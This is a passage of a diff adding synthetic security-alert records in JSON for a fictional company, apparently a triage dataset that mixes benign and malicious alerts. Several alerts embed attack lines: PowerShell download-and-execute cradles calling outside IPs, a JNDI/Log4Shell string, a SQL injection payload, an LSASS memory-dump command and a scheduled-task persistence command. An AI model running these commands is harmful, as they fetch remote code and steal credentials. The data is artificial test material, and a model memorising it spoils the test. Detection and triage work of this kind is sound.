+  },
+  {
+    "id": "ALR-0111",
+    "source": "edr",
+    "rule_name": "Scheduled Task Created",
+    "title": "Suspicious scheduled task on WS-FIN-010",
+    "description": "Task 'OneDriveSync' created on WS-FIN-010 running an unsigned binary from AppData at every logon as SYSTEM. Task name imitates a Microsoft component.",
+    "timestamp": "2026-10-20T02:13:06Z",
+    "host": "WS-FIN-010",
+    "user": "kwilliams",
+    "process": {
+      "command_line": "schtasks /create /tn \"OneDriveSync\" /tr \"C:\\Users\\kwilliams\\AppData\\Roaming\\svc\\upd.exe\" /sc onlogon /ru SYSTEM"
+    }
+  },
+  {
+    "id": "ALR-0112",
+    "source": "firewall",
+    "rule_name": "Port Scan Detected",
+    "title": "Inbound port scan from 45.155.205.127",
+    "description": "External IP 45.155.205.127 probed 909 ports on the perimeter firewall in 5 minutes. All connections were dropped.",
+    "timestamp": "2026-10-08T04:26:29Z",
+    "src_ip": "45.155.205.127",
+    "raw": {
+      "ports_probed": 909,
+      "action": "dropped",
+      "direction": "inbound"
+    }
+  },
+  {
+    "id": "ALR-0113",
+    "source": "okta",
+    "rule_name": "Brute Force Login Attempt",
+    "title": "Brute force against sjohnson",
+    "description": "190 failed logins for sjohnson from 73.134.238.63 in 3 minutes.",
+    "timestamp": "2026-10-19T08:23:16Z",
+    "user": "sjohnson",
+    "src_ip": "73.134.238.63",
+    "raw": {
+      "failed_count": 190,
+      "window_minutes": 3,
+      "subsequent_success": false,
+      "auth_type": "password"
+    }
+  },
+  {
+    "id": "ALR-0114",
+    "source": "windows_security",
+    "rule_name": "Certificate Expiring",
+    "title": "TLS certificate expiring on SRV-WEB01",
+    "description": "TLS certificate for portal.acme.example expires in 9 days.",
+    "timestamp": "2026-10-08T16:15:15Z"
+  },
+  {
+    "id": "ALR-0115",
+    "source": "proxy",
+    "rule_name": "Large Upload to Cloud Storage",
+    "title": "Large upload by nlee",
+    "description": "nlee uploaded 12.4 GB to dropbox.com (personal cloud storage, not sanctioned) from WS-OPS-021 at 02:40, well outside the user's normal hours. Files came from \\\\SRV-FILE01\\Finance.",
+    "timestamp": "2026-10-03T03:16:15Z",
+    "user": "nlee",
+    "host": "WS-OPS-021",
+    "raw": {
+      "destination": "dropbox.com",
+      "bytes_out_gb": 12.4,
+      "category": "personal",
+      "source_share": "Finance"
+    }
+  },
+  {
+    "id": "ALR-0116",
+    "source": "okta",
+    "rule_name": "Brute Force Login Attempt",
+    "title": "Brute force against sjohnson",
+    "description": "58 failed logins for sjohnson from 73.204.164.209 in 4 minutes.",
+    "timestamp": "2026-10-15T11:02:56Z",
+    "user": "sjohnson",
+    "src_ip": "73.204.164.209",
+    "raw": {
+      "failed_count": 58,
+      "window_minutes": 4,
+      "subsequent_success": false,
+      "auth_type": "password"
+    }
+  },
+  {
+    "id": "ALR-0117",
+    "source": "azure_ad",
+    "rule_name": "Impossible Travel",
+    "title": "Impossible travel for mgarcia",
+    "description": "User mgarcia signed in from 203.0.113.10 (US) and then from 104.28.14.7 (US) 20 minutes later. Distance implies travel faster than possible.",
+    "timestamp": "2026-10-03T11:32:55Z",
+    "user": "mgarcia",
+    "src_ip": "104.28.14.7",
+    "raw": {
+      "first_ip": "203.0.113.10",
+      "second_ip": "104.28.14.7",
+      "minutes_between": 20,
+      "new_device": false
+    }
+  },
+  {
+    "id": "ALR-0118",
+    "source": "edr",
+    "rule_name": "LSASS Memory Access",
+    "title": "LSASS access on WS-SALES-006",
+    "description": "MsMpEng.exe (Microsoft Defender, signed) opened a handle to lsass.exe on WS-SALES-006 during a scheduled scan.",
+    "timestamp": "2026-10-09T21:00:06Z",
+    "host": "WS-SALES-006",
+    "user": "SYSTEM",
+    "process": {
+      "name": "MsMpEng.exe",
+      "target": "lsass.exe",
+      "signed": true,
+      "access": "0x1010"
+    }
+  },
+  {
+    "id": "ALR-0119",
+    "source": "windows_security",
+    "rule_name": "Brute Force Login Attempt",
+    "title": "Brute force against administrator",
+    "description": "59 failed logins for administrator from 73.237.133.94 in 2 minutes.",
+    "timestamp": "2026-10-07T08:02:38Z",
+    "user": "administrator",
+    "src_ip": "73.237.133.94",
+    "dst_host": "SRV-EXCH01",
+    "raw": {
+      "failed_count": 59,
+      "window_minutes": 2,
+      "subsequent_success": false,
+      "auth_type": "password"
+    }
+  },
+  {
+    "id": "ALR-0120",
+    "source": "edr",
+    "rule_name": "PowerShell Execution Policy Bypass",
+    "title": "PowerShell bypass on WS-ENG-003",
+    "description": "PowerShell started with -ExecutionPolicy Bypass on WS-ENG-003 by SYSTEM. Parent: ccmexec.exe (Microsoft SCCM client). Script path is in the SCCM cache.",
+    "timestamp": "2026-10-01T19:26:43Z",
+    "host": "WS-ENG-003",
+    "user": "SYSTEM",
+    "process": {
+      "name": "powershell.exe",
+      "command_line": "powershell.exe -ExecutionPolicy Bypass -File C:\\Windows\\CCM\\SystemTemp\\inventory.ps1",
+      "parent": "ccmexec.exe",
+      "signed_parent": true
+    }
+  },
+  {
+    "id": "ALR-0121",
+    "source": "edr",
+    "rule_name": "Malware Detected",
+    "title": "Malware detected on WS-SALES-008",
+    "description": "AV detected invoice_10234.exe on WS-SALES-008 and quarantined it before execution.",
+    "timestamp": "2026-10-14T03:50:25Z",
+    "host": "WS-SALES-008",
+    "user": "kwilliams",
+    "file_hash": "40f5fefe7e3dbaa9ef1f71db2a4bc859b3a1e3fcbacbd9b607ae6e4b447f88f8",
+    "file": {
+      "name": "invoice_10234.exe",
+      "path": "C:\\Users\\kwilliams\\Downloads\\invoice_10234.exe"
+    },
+    "raw": {
+      "action": "quarantined",
+      "executed": false
+    }
+  },
+  {
+    "id": "ALR-0122",
+    "source": "windows_security",
+    "rule_name": "External RDP Login",
+    "title": "RDP login to SRV-DC02 from internet",
+    "description": "Successful RDP (logon type 10) to SRV-DC02 as administrator from external IP 73.118.80.252. RDP is not supposed to be exposed to the internet.",
+    "timestamp": "2026-10-03T20:10:25Z",
+    "host": "SRV-DC02",
+    "user": "administrator",
+    "src_ip": "73.118.80.252",
+    "raw": {
+      "logon_type": 10,
+      "success": true
+    }
+  },
+  {
+    "id": "ALR-0123",
+    "source": "windows_security",
+    "rule_name": "Certificate Expiring",
+    "title": "TLS certificate expiring on SRV-WEB01",
+    "description": "TLS certificate for portal.acme.example expires in 9 days.",
+    "timestamp": "2026-10-22T18:26:03Z"
+  },
+  {
+    "id": "ALR-0124",
+    "source": "edr",
+    "rule_name": "Malware Detected",
+    "title": "Malware detected on WS-SALES-001",
+    "description": "AV detected setup_x64.exe on WS-SALES-001 and quarantined it before execution.",
+    "timestamp": "2026-10-13T06:00:27Z",
+    "host": "WS-SALES-001",
+    "user": "nlee",
+    "file_hash": "a0610a514d2422ab2d91d09809cf134ef00e6d2fb74ea684cb7c904996efdb9a",
+    "file": {
+      "name": "setup_x64.exe",
+      "path": "C:\\Users\\nlee\\Downloads\\setup_x64.exe"
+    },
+    "raw": {
+      "action": "quarantined",
+      "executed": false
+    }
+  },
+  {
+    "id": "ALR-0125",
+    "source": "waf",
+    "rule_name": "Web Exploit Attempt",
+    "title": "Blocked exploit attempt against SRV-WEB01",
+    "description": "WAF blocked a request from 45.155.205.124 to SRV-WEB01 with payload '${jndi:ldap://45.155.205.124:1389/a}'. HTTP 403 returned.",
+    "timestamp": "2026-10-13T18:56:23Z",
+    "host": "SRV-WEB01",
+    "src_ip": "45.155.205.124",
+    "raw": {
+      "payload": "${jndi:ldap://45.155.205.124:1389/a}",
+      "response_code": 403,
+      "blocked": true
+    }
+  },
+  {
+    "id": "ALR-0126",
+    "source": "okta",
+    "rule_name": "MFA Push Fatigue",
+    "title": "MFA push spam for sjohnson",
+    "description": "sjohnson received 29 MFA push requests in 15 minutes for sign-ins from 194.26.192.78. The user approved the last one.",
+    "timestamp": "2026-10-05T23:51:58Z",
+    "user": "sjohnson",
+    "src_ip": "194.26.192.78",
+    "raw": {
+      "push_count": 29,
+      "approved": true
+    }
+  },
+  {
+    "id": "ALR-0127",
+    "source": "edr",
+    "rule_name": "Sensor Offline",
+    "title": "EDR sensor offline on WS-FIN-012",
+    "description": "EDR sensor on WS-FIN-012 has not checked in for 3 days. Asset inventory shows the laptop as in repair.",
+    "timestamp": "2026-10-20T19:47:32Z"
+  },
+  {
+    "id": "ALR-0128",
+    "source": "firewall",
+    "rule_name": "Port Scan Detected",
+    "title": "Inbound port scan from 162.142.125.10",
+    "description": "External IP 162.142.125.10 probed 474 ports on the perimeter firewall in 5 minutes. All connections were dropped.",
+    "timestamp": "2026-10-04T12:31:48Z",
+    "src_ip": "162.142.125.10",
+    "raw": {
+      "ports_probed": 474,
+      "action": "dropped",
+      "direction": "inbound"
+    }
+  },
+  {
+    "id": "ALR-0129",
+    "source": "edr",
+    "rule_name": "Scheduled Task Created",
+    "title": "Suspicious scheduled task on WS-OPS-008",
+    "description": "Task 'OneDriveSync' created on WS-OPS-008 running an unsigned binary from AppData at every logon as SYSTEM. Task name imitates a Microsoft component.",
+    "timestamp": "2026-10-10T04:53:02Z",
+    "host": "WS-OPS-008",
+    "user": "apatel",
+    "process": {
+      "command_line": "schtasks /create /tn \"OneDriveSync\" /tr \"C:\\Users\\apatel\\AppData\\Roaming\\svc\\upd.exe\" /sc onlogon /ru SYSTEM"
+    }
+  },
+  {
+    "id": "ALR-0130",
+    "source": "proxy",
+    "rule_name": "Large Upload to Cloud Storage",
+    "title": "Large upload by sjohnson",
+    "description": "sjohnson uploaded 2.0 GB to acme.sharepoint.com (company-sanctioned SharePoint) from WS-ENG-017 during work hours.",
+    "timestamp": "2026-10-21T20:05:57Z",
+    "user": "sjohnson",
+    "host": "WS-ENG-017",
+    "raw": {
+      "destination": "acme.sharepoint.com",
+      "bytes_out_gb": 2.0,
+      "category": "sanctioned"
+    }
+  },
+  {
+    "id": "ALR-0131",
+    "source": "okta",
+    "rule_name": "Brute Force Login Attempt",
+    "title": "Brute force against dnguyen",
+    "description": "247 failed logins for dnguyen from 73.54.50.124 in 5 minutes.",
+    "timestamp": "2026-10-06T18:13:02Z",
+    "user": "dnguyen",
+    "src_ip": "73.54.50.124",
+    "raw": {
+      "failed_count": 247,
+      "window_minutes": 5,
+      "subsequent_success": false,
+      "auth_type": "password"
+    }
+  },
+  {
+    "id": "ALR-0132",
+    "source": "edr",
+    "rule_name": "Malware Detected",
+    "title": "Malware detected on WS-HR-019",
+    "description": "AV detected invoice_10234.exe on WS-HR-019 and quarantined it before execution.",
+    "timestamp": "2026-10-18T21:02:42Z",
+    "host": "WS-HR-019",
+    "user": "lchen",
+    "file_hash": "0c0e0d60947a92b0734bed44c3e188315ab857a1c9b42c29d3cdade89b08d083",
+    "file": {
+      "name": "invoice_10234.exe",
+      "path": "C:\\Users\\lchen\\Downloads\\invoice_10234.exe"
+    },
+    "raw": {
+      "action": "quarantined",
+      "executed": false
+    }
+  },
+  {
+    "id": "ALR-0133",
+    "source": "windows_security",
+    "rule_name": "External RDP Login",
+    "title": "RDP login to SRV-DC01 from internet",
+    "description": "Successful RDP (logon type 10) to SRV-DC01 as svc_backup from external IP 73.183.191.167. RDP is not supposed to be exposed to the internet.",
+    "timestamp": "2026-10-21T13:19:37Z",
+    "host": "SRV-DC01",
+    "user": "svc_backup",
+    "src_ip": "73.183.191.167",
+    "raw": {
+      "logon_type": 10,
+      "success": true
+    }
+  },
+  {
+    "id": "ALR-0134",
+    "source": "edr",
+    "rule_name": "Malicious File Executed",
+    "title": "Malicious process on WS-HR-002",
+    "description": "invoice_10234.exe executed on WS-HR-002 by bthompson. AV remediation failed; the process made outbound network connections.",
+    "timestamp": "2026-10-20T15:29:15Z",
+    "host": "WS-HR-002",
+    "user": "bthompson",
+    "file_hash": "b9e11867f0cb2c6402889a2a5832034b5013a0187ed08bdb10b6849effdd93c7",
+    "file": {
+      "name": "invoice_10234.exe",
+      "path": "C:\\Users\\bthompson\\AppData\\Local\\Temp\\invoice_10234.exe"
+    },
+    "raw": {
+      "action": "remediation_failed",
+      "executed": true
+    }
+  },
+  {
+    "id": "ALR-0135",
+    "source": "edr",
+    "rule_name": "Malware Detected",
+    "title": "Malware detected on WS-SALES-008",
+    "description": "AV detected invoice_10234.exe on WS-SALES-008 and quarantined it before execution.",
+    "timestamp": "2026-10-05T11:27:23Z",
+    "host": "WS-SALES-008",
+    "user": "pjackson",
+    "file_hash": "2120a6ba07e0e44e5be4c297bbe42285a6ac7ec1bae546bce959bf35039bafda",
+    "file": {
+      "name": "invoice_10234.exe",
+      "path": "C:\\Users\\pjackson\\Downloads\\invoice_10234.exe"
+    },
+    "raw": {
+      "action": "quarantined",
+      "executed": false
+    }
+  },
+  {
+    "id": "ALR-0136",
+    "source": "edr",
+    "rule_name": "LSASS Memory Access",
+    "title": "LSASS access on WS-HR-009",
+    "description": "MsMpEng.exe (Microsoft Defender, signed) opened a handle to lsass.exe on WS-HR-009 during a scheduled scan.",
+    "timestamp": "2026-10-17T16:42:02Z",
+    "host": "WS-HR-009",
+    "user": "SYSTEM",
+    "process": {
+      "name": "MsMpEng.exe",
+      "target": "lsass.exe",
+      "signed": true,
+      "access": "0x1010"
+    }
+  },
+  {
+    "id": "ALR-0137",
+    "source": "windows_security",
+    "rule_name": "Local Admin Account Created",
+    "title": "New admin account on SRV-DC02",
+    "description": "Account svc_monitor created and added to local Administrators on SRV-DC02 by it-admin during business hours. Matches change ticket CHG-51120.",
+    "timestamp": "2026-10-17T15:03:48Z",
+    "host": "SRV-DC02",
+    "user": "it-admin",
+    "raw": {
+      "new_account": "svc_monitor",
+      "change_ticket": true
+    }
+  },
+  {
+    "id": "ALR-0138",
+    "source": "edr",
+    "rule_name": "Scheduled Task Created",
+    "title": "Suspicious scheduled task on WS-HR-001",
+    "description": "Task 'OneDriveSync' created on WS-HR-001 running an unsigned binary from AppData at every logon as SYSTEM. Task name imitates a Microsoft component.",
+    "timestamp": "2026-10-05T00:54:04Z",
+    "host": "WS-HR-001",
+    "user": "bthompson",
+    "process": {
+      "command_line": "schtasks /create /tn \"OneDriveSync\" /tr \"C:\\Users\\bthompson\\AppData\\Roaming\\svc\\upd.exe\" /sc onlogon /ru SYSTEM"
+    }
+  },
+  {
+    "id": "ALR-0139",
+    "source": "ids",
+    "rule_name": "Internal Port Scan",
+    "title": "Internal port scan from SRV-NESSUS01",
+    "description": "SRV-NESSUS01 (10.20.8.51) scanned 254 hosts on 10.20.0.0/16 across 1000 ports. Host is the vulnerability scanner; scan falls in the weekly Tuesday scan window.",
+    "timestamp": "2026-10-05T15:18:51Z",
+    "host": "SRV-NESSUS01",
+    "src_ip": "10.20.8.51",
+    "raw": {
+      "hosts_scanned": 254,
+      "ports": 1000,
+      "scheduled": true
+    }
+  },
+  {
+    "id": "ALR-0140",
+    "source": "windows_security",
+    "rule_name": "Local Admin Account Created",
+    "title": "New admin account on SRV-DC02",
+    "description": "Account helpdesk2 created and added to local Administrators on SRV-DC02 at 03:14 by mgarcia, a non-IT user. No matching change ticket.",
+    "timestamp": "2026-10-12T04:48:16Z",
+    "host": "SRV-DC02",
+    "user": "mgarcia",
+    "raw": {
+      "new_account": "helpdesk2",
+      "change_ticket": false
+    }
+  },
+  {
+    "id": "ALR-0141",
+    "source": "proxy",
+    "rule_name": "Large Upload to Cloud Storage",
+    "title": "Large upload by nlee",
+    "description": "nlee uploaded 36.8 GB to transfer.sh (personal cloud storage, not sanctioned) from WS-SALES-007 at 02:40, well outside the user's normal hours. Files came from \\\\SRV-FILE01\\Finance.",
+    "timestamp": "2026-10-15T01:16:32Z",
+    "user": "nlee",
+    "host": "WS-SALES-007",
+    "raw": {
+      "destination": "transfer.sh",
+      "bytes_out_gb": 36.8,
+      "category": "personal",
+      "source_share": "Finance"
+    }
+  },
+  {
+    "id": "ALR-0142",
+    "source": "proxy",
+    "rule_name": "Large Upload to Cloud Storage",
+    "title": "Large upload by sjohnson",
+    "description": "sjohnson uploaded 2.0 GB to acme-my.sharepoint.com (company-sanctioned SharePoint) from WS-ENG-003 during work hours.",
+    "timestamp": "2026-10-08T19:23:02Z",
+    "user": "sjohnson",
+    "host": "WS-ENG-003",
+    "raw": {
+      "destination": "acme-my.sharepoint.com",
+      "bytes_out_gb": 2.0,
+      "category": "sanctioned"
+    }
+  },
+  {
+    "id": "ALR-0143",
+    "source": "edr",
+    "rule_name": "Suspicious Encoded PowerShell",
+    "title": "Encoded PowerShell on WS-HR-004",
+    "description": "Encoded PowerShell command on WS-HR-004 by lchen, parent process winword.exe. Decoded command downloads and executes a script from 194.26.192.61.",
+    "timestamp": "2026-10-11T12:10:50Z",
+    "host": "WS-HR-004",
+    "user": "lchen",
+    "dst_ip": "194.26.192.61",
+    "process": {
+      "name": "powershell.exe",
+      "command_line": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADQALgAyADYALgAxADkAMgAuADYAMQAvAGEALgBwAHMAMQAnACkA",
+      "parent": "winword.exe",
+      "decoded": "IEX (New-Object Net.WebClient).DownloadString('http://194.26.192.61/a.ps1')"
+    }
+  },
+  {
+    "id": "ALR-0144",
+    "source": "okta",
+    "rule_name": "MFA Push Fatigue",
+    "title": "MFA push spam for pjackson",
+    "description": "pjackson received 32 MFA push requests in 15 minutes for sign-ins from 45.155.205.103. The user denied all of them.",
+    "timestamp": "2026-10-12T03:35:33Z",
+    "user": "pjackson",
+    "src_ip": "45.155.205.103",
+    "raw": {
+      "push_count": 32,
+      "approved": false
+    }
+  },
+  {
+    "id": "ALR-0145",
+    "source": "okta",
+    "rule_name": "MFA Push Fatigue",
+    "title": "MFA push spam for ehernandez",
+    "description": "ehernandez received 32 MFA push requests in 15 minutes for sign-ins from 194.26.192.68. The user denied all of them.",
+    "timestamp": "2026-10-13T23:51:23Z",
+    "user": "ehernandez",
+    "src_ip": "194.26.192.68",
+    "raw": {
+      "push_count": 32,
+      "approved": false
+    }
+  },
+  {
+    "id": "ALR-0146",
+    "source": "okta",
+    "rule_name": "Brute Force Login Attempt",
+    "title": "Brute force against svc_backup",
+    "description": "209 failed logins for svc_backup from 194.26.192.77 in 3 minutes.",
+    "timestamp": "2026-10-08T05:39:47Z",
+    "user": "svc_backup",
+    "src_ip": "194.26.192.77",
+    "raw": {
+      "failed_count": 209,
+      "window_minutes": 3,
+      "subsequent_success": false,
+      "auth_type": "password"
+    }
+  },
+  {
+    "id": "ALR-0147",
+    "source": "proxy",
+    "rule_name": "Periodic Beaconing",
+    "title": "Beaconing from WS-ENG-014",
+    "description": "WS-ENG-014 sent HTTP POSTs to 73.251.201.8 every 300 seconds (+/- 2s jitter) for 6 hours. Small, uniform request sizes. User agent mimics an outdated browser.",
+    "timestamp": "2026-10-19T21:57:20Z",
+    "host": "WS-ENG-014",
+    "dst_ip": "73.251.201.8",
+    "raw": {
+      "interval_seconds": 300,
+      "duration_hours": 6,
+      "requests": 72
+    }
+  },
+  {
+    "id": "ALR-0148",
+    "source": "edr",
+    "rule_name": "AV Signature Update Failed",
+    "title": "Signature update failed on WS-SALES-024",
+    "description": "Defender signature update failed on WS-SALES-024 (error 0x80240022). Last successful update 26 hours ago.",
+    "timestamp": "2026-10-08T16:18:39Z"
+  },
+  {
+    "id": "ALR-0149",
+    "source": "edr",
+    "rule_name": "LSASS Memory Access",
+    "title": "LSASS dump on WS-HR-006",
+    "description": "Process dumped lsass.exe memory on WS-HR-006 under it-admin. Command: rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\Temp\\d.bin full",
+    "timestamp": "2026-10-02T04:31:14Z",
+    "host": "WS-HR-006",
+    "user": "it-admin",
+    "process": {
+      "command_line": "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\Temp\\d.bin full",
+      "target": "lsass.exe",
+      "access": "0x1FFFFF"
+    }
+  },
+  {
+    "id": "ALR-0150",
+    "source": "edr",
+    "rule_name": "Suspicious Encoded PowerShell",
+    "title": "Encoded PowerShell on WS-FIN-006",
+    "description": "Encoded PowerShell command on WS-FIN-006 by jsmith, parent process explorer.exe. Decoded command downloads and executes a script from 185.220.101.16.",
+    "timestamp": "2026-10-01T18:22:19Z",
+    "host": "WS-FIN-006",
+    "user": "jsmith",
+    "dst_ip": "185.220.101.16",
+    "process": {
+      "name": "powershell.exe",
+      "command_line": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4AMQA2AC8AYQAuAHAAcwAxACcAKQA=",
+      "parent": "explorer.exe",
+      "decoded": "IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.16/a.ps1')"
+    }
+  },
+  {
+    "id": "ALR-0151",
+    "source": "waf",
+    "rule_name": "Web Exploit Attempt",
+    "title": "Exploit against SRV-WEB01 succeeded",
+    "description": "Request from 45.155.205.115 to SRV-WEB01 with payload \"' OR 1=1 UNION SELECT username,password FROM users--\" returned HTTP 200. Minutes later, a new file shell.aspx appeared in the web root and w3wp.exe spawned cmd.exe.",
+    "timestamp": "2026-10-19T09:37:08Z",
+    "host": "SRV-WEB01",
+    "src_ip": "45.155.205.115",
+    "raw": {
+      "payload": "' OR 1=1 UNION SELECT username,password FROM users--",
+      "response_code": 200,
+      "blocked": false,
+      "webshell": "shell.aspx"
+    }
+  },
+  {
+    "id": "ALR-0152",
+    "source": "windows_security",
+    "rule_name": "External RDP Login",
+    "title": "RDP login to SRV-WEB01 from internet",
+    "description": "Successful RDP (logon type 10) to SRV-WEB01 as it-admin from external IP 91.240.118.160. RDP is not supposed to be exposed to the internet.",
+    "timestamp": "2026-10-05T00:59:51Z",
+    "host": "SRV-WEB01",
+    "user": "it-admin",
+    "src_ip": "91.240.118.160",
+    "raw": {
+      "logon_type": 10,
+      "success": true
+    }
+  },
+  {
+    "id": "ALR-0153",
+    "source": "okta",
+    "rule_name": "Password Spray Detected",
+    "title": "Password spray from 185.220.101.29",
+    "description": "Single IP 185.220.101.29 attempted logins against 15 different accounts (1-2 attempts each) in 10 minutes using common passwords. One attempt succeeded for mgarcia.",
+    "timestamp": "2026-10-08T05:57:00Z",
+    "src_ip": "185.220.101.29",
+    "user": "mgarcia",
+    "raw": {
+      "targeted_accounts": [
+        "mgarcia",
+        "nlee",
+        "bthompson",
+        "lchen",
+        "pjackson",
+        "kwilliams",
+        "rbrown",
+        "ehernandez",
+        "jsmith",
+        "tmartin",
+        "sjohnson",
+        "omoore",
+        "apatel",
+        "cwhite",
+        "dnguyen"
+      ],
+      "attempts_per_account": "1-2",
+      "successes": [
+        "mgarcia"
+      ]
+    }
+  },
+  {
+    "id": "ALR-0154",
+    "source": "edr",
+    "rule_name": "Suspicious Encoded PowerShell",
+    "title": "Encoded PowerShell on WS-HR-021",
+    "description": "Encoded PowerShell command on WS-HR-021 by jsmith, parent process winword.exe. Decoded command downloads and executes a script from 45.155.205.121.",
+    "timestamp": "2026-10-06T01:58:49Z",
+    "host": "WS-HR-021",
+    "user": "jsmith",
+    "dst_ip": "45.155.205.121",
+    "process": {
+      "name": "powershell.exe",
+      "command_line": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8ANAA1AC4AMQA1ADUALgAyADAANQAuADEAMgAxAC8AYQAuAHAAcwAxACcAKQA=",
+      "parent": "winword.exe",
+      "decoded": "IEX (New-Object Net.WebClient).DownloadString('http://45.155.205.121/a.ps1')"
+    }
+  },
+  {
+    "id": "ALR-0155",
+    "source": "proxy",
+    "rule_name": "Periodic Beaconing",
+    "title": "Beaconing from WS-SALES-007",
+    "description": "WS-SALES-007 sent HTTP POSTs to 91.240.118.170 every 300 seconds (+/- 2s jitter) for 6 hours. Small, uniform request sizes. User agent mimics an outdated browser.",
+    "timestamp": "2026-10-07T04:26:12Z",
+    "host": "WS-SALES-007",
+    "dst_ip": "91.240.118.170",
+    "raw": {
+      "interval_seconds": 300,
+      "duration_hours": 6,
+      "requests": 72
+    }
+  },
+  {
+    "id": "ALR-0156",
+    "source": "ids",
+    "rule_name": "Internal Port Scan",
+    "title": "Internal port scan from WS-SALES-011",
+    "description": "Workstation WS-SALES-011 (10.20.33.167) connected to 180 internal hosts on ports 445, 3389, 5985 and 22 in 3 minutes. This host has no history of scanning.",
+    "timestamp": "2026-10-21T13:52:39Z",
+    "host": "WS-SALES-011",
+    "src_ip": "10.20.33.167",
+    "raw": {
+      "hosts_scanned": 180,
+      "ports": [
+        445,
+        3389,
+        5985,
+        22
+      ],
+      "scheduled": false
+    }
+  },
+  {
+    "id": "ALR-0157",
+    "source": "proxy",
+    "rule_name": "Periodic Beaconing",
+    "title": "Beaconing from WS-ENG-016",
+    "description": "WS-ENG-016 sent HTTP POSTs to 185.220.101.18 every 30 seconds (+/- 2s jitter) for 6 hours. Small, uniform request sizes. User agent mimics an outdated browser.",
+    "timestamp": "2026-10-16T22:34:00Z",
+    "host": "WS-ENG-016",
+    "dst_ip": "185.220.101.18",
+    "raw": {
+      "interval_seconds": 30,
+      "duration_hours": 6,
+      "requests": 720
+    }
+  },
+  {
+    "id": "ALR-0158",
+    "source": "azure_ad",
+    "rule_name": "Impossible Travel",
+    "title": "Impossible travel for rbrown",
+    "description": "User rbrown signed in from 198.51.100.20 (US) and then from 73.149.108.46 (VN) 36 minutes later. Distance implies travel faster than possible.",
+    "timestamp": "2026-10-06T07:06:16Z",
+    "user": "rbrown",
+    "src_ip": "73.149.108.46",
+    "raw": {
+      "first_ip": "198.51.100.20",
+      "second_ip": "73.149.108.46",
+      "minutes_between": 36,
+      "new_device": false
+    }
+  },
+  {
+    "id": "ALR-0159",
+    "source": "proxy",
+    "rule_name": "Periodic Beaconing",
+    "title": "Beaconing from WS-FIN-005",
+    "description": "WS-FIN-005 sent HTTP POSTs to 185.220.101.25 every 300 seconds (+/- 2s jitter) for 6 hours. Small, uniform request sizes. User agent mimics an outdated browser.",
+    "timestamp": "2026-10-09T22:03:17Z",
+    "host": "WS-FIN-005",
+    "dst_ip": "185.220.101.25",
+    "raw": {
+      "interval_seconds": 300,
+      "duration_hours": 6,
+      "requests": 72
+    }
+  },
+  {
+    "id": "ALR-0160",
+    "source": "azure_ad",
+    "rule_name": "Impossible Travel",
+    "title": "Impossible travel for bthompson",
+    "description": "User bthompson signed in from 203.0.113.11 (US) and then from 73.10.103.4 (NG) 21 minutes later. Distance implies travel faster than possible.",
+    "timestamp": "2026-10-03T16:00:10Z",
+    "user": "bthompson",
+    "src_ip": "73.10.103.4",
+    "raw": {
+      "first_ip": "203.0.113.11",
+      "second_ip": "73.10.103.4",
+      "minutes_between": 21,
+      "new_device": false
+    }
+  },
+  {
+    "id": "ALR-0161",
+    "source": "windows_security",
+    "rule_name": "Certificate Expiring",
+    "title": "TLS certificate expiring on SRV-WEB01",
+    "description": "TLS certificate for portal.acme.example expires in 9 days.",
+    "timestamp": "2026-10-07T16:47:58Z"
+  },
+  {
+    "id": "ALR-0162",
+    "source": "edr",
+    "rule_name": "Malware Detected",
+    "title": "Malware detected on WS-OPS-017",
+    "description": "AV detected setup_x64.exe on WS-OPS-017 and quarantined it before execution.",
+    "timestamp": "2026-10-17T22:00:54Z",
+    "host": "WS-OPS-017",
+    "user": "rbrown",
+    "file_hash": "2e9855cb732ae6011db7ba77dfe5c9f40f4f6b8445e8b508deb19086f5438832",
+    "file": {
+      "name": "setup_x64.exe",
+      "path": "C:\\Users\\rbrown\\Downloads\\setup_x64.exe"
+    },
+    "raw": {
+      "action": "quarantined",
+      "executed": false
+    }
+  },
+  {
+    "id": "ALR-0163",
+    "source": "azure_ad",
+    "rule_name": "Impossible Travel",
+    "title": "Impossible travel for omoore",
+    "description": "User omoore signed in from 203.0.113.10 (US) and then from 104.28.14.8 (US) 21 minutes later. Distance implies travel faster than possible.",
+    "timestamp": "2026-10-13T19:37:04Z",
+    "user": "omoore",
+    "src_ip": "104.28.14.8",
+    "raw": {
+      "first_ip": "203.0.113.10",
+      "second_ip": "104.28.14.8",
+      "minutes_between": 21,
+      "new_device": false
+    }
+  },
+  {
+    "id": "ALR-0164",
+    "source": "proxy",
+    "rule_name": "Periodic Beaconing",
+    "title": "Beaconing from WS-FIN-022",
+    "description": "WS-FIN-022 sent HTTP POSTs to 185.220.101.28 every 30 seconds (+/- 2s jitter) for 6 hours. Small, uniform request sizes. User agent mimics an outdated browser.",
+    "timestamp": "2026-10-04T19:59:10Z",
+    "host": "WS-FIN-022",
+    "dst_ip": "185.220.101.28",
+    "raw": {
+      "interval_seconds": 30,
+      "duration_hours": 6,
+      "requests": 720
+    }
+  },
+  {
+    "id": "ALR-0165",
+    "source": "okta",
+    "rule_name": "Brute Force Login Attempt",
+    "title": "Brute force against it-admin",
+    "description": "61 failed logins for it-admin from 185.220.101.27 in 1 minutes.",
+    "timestamp": "2026-10-03T23:02:04Z",
+    "user": "it-admin",
+    "src_ip": "185.220.101.27",
+    "raw": {
+      "failed_count": 61,
+      "window_minutes": 1,
+      "subsequent_success": false,
+      "auth_type": "password"
+    }
+  },
+  {
+    "id": "ALR-0166",
+    "source": "edr",
+    "rule_name": "PowerShell Execution Policy Bypass",
